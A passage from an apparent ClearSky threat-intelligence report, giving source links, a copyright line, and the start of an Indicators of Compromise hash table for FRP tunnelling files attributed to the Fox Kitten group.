sources:\n\nhttps://us-cert.cisa.gov/ncas/tips/ST18-001\n\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-073a\n\nhttps://us-cert.cisa.gov/ncas/tips/ST04-006\n\nhttps://csrc.nist.gov/publications/detail/sp/800-46/rev-2/final\n\nhttps://us-cert.cisa.gov/ncas/tips/ST05-012\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\n###### Indicators of Compromise\n\n Hashes\n\nHash File Name Virus Total Type\n\nSignificant\n\nSubmitter\n\nFRPC\n\nc8bc262d7126c3399baaec3bee89d542\n\nc94a0f902b3b8cc4ca5e4cc9004ac9eaa4614699 frpc.exe USA Portable\n\nTurkey Executable\n\n55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c\n\n22dbe256c7582106b7825641f3d29d5c\n\nPortable\n\n0e3853bab5aa68293b1275f3c87df975ec45fd49 frps.exe Israel\n\nExecutable\n\ndf86cd16a3008dba00590edae31d1313bd92528aca92c4f4ea7f24000ba62547\n\nf33f63ad83374e4d819a3b90fd0e3d8a\n\nPortable\n\n65cfa6529fee3dfee6b6d167fe4d1b7516630700 svchost.exe Israel\n\nExecutable\n\n483fe88d70cb09361c27468b97b7f96bd667d8c915c9f004a27d4260367d551b\n\n34d2192a166901286d39136b56f16817\n\nText – FRPC\n\nUK- zero\n\n0f0d7dfc1a4b0ddf494f6c337e6a956f8bf448fe Dllhost.dll configuration\n\ndetection\n\n(Fox Kitten)\n\na2440df2bf11c2882d139bddf5a33bfd63dcb4b82994ac2daf7c7f08b7170647\n\n14df2e509b6ee8deb3ce6ba3b88e3de0\n\nText – FRPC\n\n80190bdddf70a79a1735136f81309219c937458d Dllhost.dll -
